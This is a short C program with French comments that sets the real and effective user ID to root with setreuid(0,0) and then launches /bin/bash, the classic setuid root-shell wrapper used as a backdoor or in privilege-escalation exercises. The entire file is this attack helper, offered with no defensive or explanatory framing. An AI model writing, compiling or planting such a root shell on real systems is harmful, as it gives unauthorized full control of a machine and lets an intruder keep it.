#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void main(void)
{
/* pour forcer l’uid reel effectif et sauvé à root */
setreuid(0,0);
/* lancer le shell */
execl("/bin/bash","bash",0,NULL);
}
